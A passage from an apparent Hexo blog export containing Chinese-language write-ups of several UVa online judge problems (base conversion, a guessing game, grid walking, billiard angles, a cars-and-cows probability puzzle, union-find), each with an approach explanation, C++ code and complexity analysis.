class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="keyword">bool</span> end=<span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">8</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">8</span> ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;board[i][j];</span><br><span class="line">				<span class="keyword">if</span>(board[i][j]!=<span class="string">'.'</span>)</span><br><span class="line">					end=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!end)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">bool</span> found=<span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">8</span> &amp;&amp; !found ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">8</span> &amp;&amp; !found ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(board[i][j]==<span class="string">'.'</span> || board[i][j]==<span class="string">'k'</span> || board[i][j]==<span class="string">'K'</span>)</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">islower</span>(board[i][j]))&#123;</span><br><span class="line">					<span class="comment">// black</span></span><br><span class="line">					<span class="keyword">if</span>(check_over(board[i][j], i, j, <span class="number">0</span>))&#123;</span><br><span class="line">						<span class="built_in">cout</span>&lt;&lt;<span class="string">"Game #"</span>&lt;&lt;game&lt;&lt;<span class="string">": white king is in check.\n"</span>;</span><br><span class="line">						game++;</span><br><span class="line">						found=<span class="literal">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="comment">// white</span></span><br><span class="line">					<span class="keyword">if</span>(check_over(board[i][j], i, j, <span class="number">1</span>))&#123;</span><br><span class="line">						<span class="built_in">cout</span>&lt;&lt;<span class="string">"Game #"</span>&lt;&lt;game&lt;&lt;<span class="string">": black king is in check.\n"</span>;</span><br><span class="line">						game++;</span><br><span class="line">						found=<span class="literal">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!found)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Game #"</span>&lt;&lt;game&lt;&lt;<span class="string">": no king is in check.\n"</span>;</span><br><span class="line">			game++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>假設棋盤邊長為 $N$</p>
<p>輸入時間複雜度為 $O(N^2)$</p>
<p>所有棋子針對任意方向的搜尋時間複雜度都視為 $O(1)$</p>
<p>最差情況盤面上每個點都需要搜尋過，時間複雜度為 $O(N^2)$</p>
<p>每筆測資時間複雜度為 $O(2 \times N^2)$ 約為 $O(N^2)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10473</title>
    <url>/2021/03/23/UVa10473/</url>
    <content><![CDATA[<h1 id="UVa-10473"><a href="#UVa-10473" class="headerlink" title="UVa 10473"></a>UVa 10473</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10473" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10473</a></p>
<p>給一個字串 $S$ ，若 $S$ 是以 <code>0x</code> 開頭表示為 $16$ 進位，否則為 $10$ 進位</p>
<p>如果輸入 $16$ 進位，則輸出 $10$ 進位</p>
<p>如果輸入 $10$ 進位，則輸出 $16$ 進位</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><ol>
<li>先將 $S$ 想辦法換成我們熟悉的數字表示方式十進位</li>
<li>統一從十進位轉換為其他進位制</li>
</ol>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> s;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s)&#123;</span><br><span class="line">		<span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">'-'</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(s.size()&gt;<span class="number">2</span> &amp;&amp; s[<span class="number">1</span>] == <span class="string">'x'</span>)&#123;</span><br><span class="line">			<span class="comment">// hex</span></span><br><span class="line">			<span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=s.size()<span class="number">-1</span>, j=<span class="number">0</span> ; i&gt;=<span class="number">2</span> ; i--, j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(s[i]&lt;=<span class="string">'9'</span>)</span><br><span class="line">					ans+=(s[i]-<span class="string">'0'</span>)*<span class="built_in">pow</span>(<span class="number">16</span>, j);</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					ans+=(s[i]-<span class="string">'A'</span>+<span class="number">10</span>)*<span class="built_in">pow</span>(<span class="number">16</span>, j);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">// dec</span></span><br><span class="line">			<span class="keyword">long</span> <span class="keyword">long</span> num = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=s.size()<span class="number">-1</span>, j=<span class="number">0</span> ; i&gt;=<span class="number">0</span> ; i--, j++)&#123;</span><br><span class="line">				num += (s[i]-<span class="string">'0'</span>)*<span class="built_in">pow</span>(<span class="number">10</span>, j);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">string</span> ans=<span class="string">""</span>;</span><br><span class="line">			<span class="keyword">for</span>( ; num ; num/=<span class="number">16</span>)&#123;</span><br><span class="line">				<span class="keyword">int</span> m = num%<span class="number">16</span>;</span><br><span class="line">				<span class="keyword">if</span>(m&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">					ans = <span class="keyword">char</span>(m<span class="number">-10</span>+<span class="string">'A'</span>) + ans;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					ans = <span class="keyword">char</span>(m+<span class="string">'0'</span>) + ans;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"0x"</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>每種轉換方式的時間複雜度皆為 $O(log_{10}{n})$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10530</title>
    <url>/2021/04/27/UVa10530/</url>
    <content><![CDATA[<h1 id="UVa-10530"><a href="#UVa-10530" class="headerlink" title="UVa 10530"></a>UVa 10530</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10530" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10530</a></p>
<p>現在正在玩猜數字的遊戲，對方會告訴你你猜的數字太高或是太低，但是我們懷疑對方會說謊</p>
<p>假設當我們猜到正確數字時對方並不會說謊，給定每回合猜數字的結果，請幫忙判斷對方是否有說謊</p>
<p>猜數字的範圍在 $1$~$10$ 之間</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>給定一個數字，對方回覆太大(<code>too high</code>)，那麼如果沒說謊，我們的數字應該比他還小，那麼我們只需要紀錄 <code>too high</code> 當中最小的數字即可</p>
<p>反過來說，對方回覆太大(<code>too low</code>)，那麼如果沒說謊，我們的數字應該比他還大，那麼我們只需要紀錄 <code>too low</code> 當中最大的數字即可</p>
<p>如果我們猜到的數字介在 <code>too high</code> 以及 <code>too low</code> 之間，那就表示對方沒有說謊</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, Upper_bound = <span class="number">10</span>, Lower_bound = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		getchar();</span><br><span class="line">		getline(<span class="built_in">cin</span>, s);</span><br><span class="line">		<span class="keyword">if</span>(s == <span class="string">"too high"</span>)&#123;</span><br><span class="line">			<span class="comment">// 數字最大是 n-1</span></span><br><span class="line">			Upper_bound = min(Upper_bound, n<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(s == <span class="string">"too low"</span>)&#123;</span><br><span class="line">			<span class="comment">// 數字最小是 n+1</span></span><br><span class="line">			Lower_bound = max(Lower_bound, n+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(s == <span class="string">"right on"</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(n &gt;= Lower_bound &amp;&amp; n &lt;= Upper_bound)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"Stan may be honest\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"Stan is dishonest\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			Upper_bound = <span class="number">10</span>, Lower_bound = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>Binary Search</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10500</title>
    <url>/2021/03/23/UVa10500/</url>
    <content><![CDATA[<h1 id="UVa-10500"><a href="#UVa-10500" class="headerlink" title="UVa 10500"></a>UVa 10500</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10500" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10500</a></p>
<p>給一張地圖，如果不能走的話會標記 $X$ ，你會從起點 $(x,y)$ 開始走，每次檢查4個方向，並將看到的結果記錄下來</p>
<p>檢查過程當中，依序檢查 北 東 南 西 ，第一次遇到可以走的就走過去</p>
<p>在4個方向都不能走的情況下結束，並輸出紀錄的結果以及走過的步數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接把走的過程模擬過一遍</p>
<p>從起點開始，每次檢查4個方向記錄下來，並且走向第一個可以走的地方</p>
<p>一直重覆到不能走為止，將結果輸出即可</p>
<p>記得方向要從 北-&gt;東-&gt;南-&gt;西</p>
<p>另外，在檢查四個方向的過程中，記得不要往走過的點走，不然可能會永遠不會結束喔w</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,x,y,dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">15</span>][<span class="number">15</span>], res[<span class="number">15</span>][<span class="number">15</span>];</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">15</span>][<span class="number">15</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">15</span> ; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">15</span> ; j++)&#123;</span><br><span class="line">            arr[i][j]=<span class="string">'X'</span>;</span><br><span class="line">            res[i][j]=<span class="string">'?'</span>;</span><br><span class="line">            vis[i][j]=<span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_table</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 輸出表格的間隔</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=m ; i++)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"|---"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"|\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cango</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判斷是否在圖的範圍內</span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">0</span> || x&gt;n || y&lt;<span class="number">0</span> || y&gt;m) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m &amp;&amp; (n||m))&#123;</span><br><span class="line">        init();</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=m ; j++)&#123;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res[x][y]=<span class="string">'0'</span>;</span><br><span class="line">        vis[x][y]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> move=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">bool</span> found=<span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">int</span> found_x,found_y;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">                <span class="keyword">int</span> nx=x+dir[i][<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">int</span> ny=y+dir[i][<span class="number">1</span>];</span><br><span class="line">                res[nx][ny]=arr[nx][ny];</span><br><span class="line">                <span class="keyword">if</span>(cango(nx,ny) &amp;&amp; arr[nx][ny]!=<span class="string">'X'</span> &amp;&amp; !found &amp;&amp; !vis[nx][ny])&#123;</span><br><span class="line">                    found=<span class="literal">true</span>;</span><br><span class="line">                    found_x=nx;</span><br><span class="line">                    found_y=ny;</span><br><span class="line">                    vis[found_x][found_y]=<span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(found)&#123;</span><br><span class="line">                x=found_x;</span><br><span class="line">                y=found_y;</span><br><span class="line">                move++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">            print_table();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=m ; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j==<span class="number">1</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"|"</span>;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;res[i][j]&lt;&lt;<span class="string">" |"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        print_table();</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"NUMBER OF MOVEMENTS: "</span>&lt;&lt;move&lt;&lt;<span class="string">"\n"</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>輸入時間複雜度 $O(nm)$</p>
<p>每次針對4個方向尋找，時間複雜度視為 $O(1)$</p>
<p>最糟的情況需要將棋盤全部遍歷過，時間複雜度為 $O(nm)$</p>
<p>輸出時間複雜度也為 $O(nm)$</p>
<p>每筆測資總時間複雜度為 $O(3nm)$ 約為 $O(nm)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10387</title>
    <url>/2021/03/23/UVa10387/</url>
    <content><![CDATA[<h1 id="UVa-10387"><a href="#UVa-10387" class="headerlink" title="UVa 10387"></a>UVa 10387</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10387" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10387</a></p>
<p>有一張長寬分別為 $a, b$ 的桌子，在他的正中央有一顆球，這顆球會以某個速度 $v$ ，以角度 $A$ 在桌子碰撞，分別在桌子的直向與橫向處撞擊 $m, n$ 次後回到初始位置</p>
<p>求這顆球的初速 $v$ 以及初始角度 $A$</p>
<p>並且假定球再碰撞過程中並無能量損耗，一切都是完美狀況</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>可以先畫一張圖看看，會發現到球在碰撞的過程當中與橫向之間的角度，也就是初始角度 $A$ 都不會改變</p>
<p>並且由於無論如何球都必須要回到原點，每次碰撞過後為了回到原點，必須移動朝向方向(橫向或直向)移動一個長或寬的距離</p>
<p>所以我們可以透過 $a \times m$ 和 $b \times n$ 求到球在桌面上的橫向與直向的移動總距離</p>
<p>透過畢氏定理可以求得球的移動距離，再除以時間就會是速度</p>
<p>$$v = \frac{\sqrt{(am)^2+(bn)^2}}{s}<br>$$</p>
<p>角度的部分可以透過 $atan$ 求得</p>
<p>由於 C++ 經過 $atan$ 求到的是弧度，而題目要的是角度，所以要再另外計算一個弧度是多少角度 $angle=asin(1.0)/90$</p>
<p>$$A = \frac{atan(\frac{bn}{am})}{asin(1.0)/90}<br>$$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> radian = <span class="built_in">asin</span>(<span class="number">1.0</span>)/<span class="number">90</span>;</span><br><span class="line"><span class="keyword">int</span> a,b,s,m,n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;s&gt;&gt;m&gt;&gt;n &amp;&amp; (a||b||s||m||n))&#123;</span><br><span class="line">		<span class="keyword">double</span> h_len = a*m;</span><br><span class="line">		<span class="keyword">double</span> v_len = b*n;</span><br><span class="line">		<span class="keyword">double</span> angle = <span class="built_in">atan</span>(v_len/h_len)/radian;</span><br><span class="line">		<span class="keyword">double</span> v = <span class="built_in">sqrt</span>(<span class="built_in">pow</span>(h_len,<span class="number">2</span>)+<span class="built_in">pow</span>(v_len,<span class="number">2</span>))/s;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;angle&lt;&lt;<span class="string">" "</span>&lt;&lt;v&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每次輸入的計算時間可估為 $O(1)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10491</title>
    <url>/2021/03/23/UVa10491/</url>
    <content><![CDATA[<h1 id="UVa-10491"><a href="#UVa-10491" class="headerlink" title="UVa 10491"></a>UVa 10491</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10491" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10491</a></p>
<p>現在有一場遊戲，遊戲的規則是這樣的:</p>
<p>舞台上有許多扇門，每個門後都有一輛車或是一隻牛</p>
<p>身為參賽者的你，目的就是要選到有車的那扇門。在遊戲的一開始，你會選擇一扇門</p>
<p>接下來主持人會開啟幾扇在你選擇的門以外，藏有牛的門，題目保證這扇門是存在的</p>
<p>問題如下:</p>
<p>在有 $N$ 隻牛， $M$ 輛車，主持人開啟 $S$ 扇門的情況下，你贏得車的機率是多少，輸出到小數點後第 5 位</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>這題其實是數學題喔!在高中的機率當中也有類似的題目，想法是這樣的</p>
<p>一開始參賽者選擇的情況有兩個</p>
<ol>
<li><p>選擇了藏有牛的門<br> 一開始選擇藏有牛的門的機率為 $\frac{N}{N+M}$</p>
<p> 此時，剩下的門的數量為 $(N-1)+M-S$ ，車的數量為 $M$</p>
<p> 在這個前提下，選到車的機率為 $\frac{N}{N+M} \times \frac{M}{N+M-S-1}$</p>
</li>
<li><p>選擇了藏有車的門<br> 一開始選擇藏有車的門的機率為 $\frac{M}{N+M}$</p>
<p> 此時，剩下的門的數量為 $N+(M-1)-S$ ，車的數量為 $M-1$</p>
<p> 在這個前提下，選到車的機率為 $\frac{N}{N+M} \times \frac{M-1}{N+M-S-1}$</p>
</li>
</ol>
<p>最後將這兩種情況的機率相加，就會是我們的答案</p>
<p>記得，這裡的機率可能會含有小數，要使用 <code>double</code> 儲存</p>
<p>並且輸出要到小數點後第 5 位，要使用 <code>fixed</code> 和 <code>setprecision</code></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">double</span> NCOWS, NCARS, NSHOW;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;NCOWS&gt;&gt;NCARS&gt;&gt;NSHOW)&#123;</span><br><span class="line">		<span class="keyword">double</span> tot=NCOWS+NCARS;</span><br><span class="line">		<span class="comment">//choose cow</span></span><br><span class="line">		<span class="keyword">double</span> p1 = (NCOWS/tot) * (NCARS/(tot<span class="number">-1</span>-NSHOW));</span><br><span class="line">		<span class="keyword">double</span> p2 = (NCARS/tot) * ((NCARS<span class="number">-1</span>)/(tot<span class="number">-1</span>-NSHOW));</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">5</span>)&lt;&lt;p1+p2&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每一筆輸入在計算上時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa10583</title>
    <url>/2020/12/11/UVa10583/</url>
    <content><![CDATA[<h1 id="UVa-10583"><a href="#UVa-10583" class="headerlink" title="UVa 10583"></a>UVa 10583</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10583" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10583</a><br>有 $n$ 個人，每個人至多有 $1$ 個宗教信仰，現在給你 $m$ 對數字 $i, j$ ，表示 $i, j$ 擁有相同的宗教信仰。求在這 $n$ 個人當中最多有多少不同的宗教信仰?</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>這裡可以想到並查集的概念<br>我們可以將這 $n$ 個人分成幾個集合，而每個集合都有一個老大，並且該集合內的所有人都會指向老大<br>這樣一來，當我們要判定一個人所在的群組是否已經被算過的話，就可以透過遞迴的方式找到群組的老大，看看老大有沒有被算過即可，也就是將集合以老大表示。</p>
<p>另外，在並查集當中有個優化的方式，也就是在遞迴查詢的過程當中，順便將詢問的人指向最終查詢到的老大，如此一來下次在詢問的時候就可以避免再次遞迴。</p>
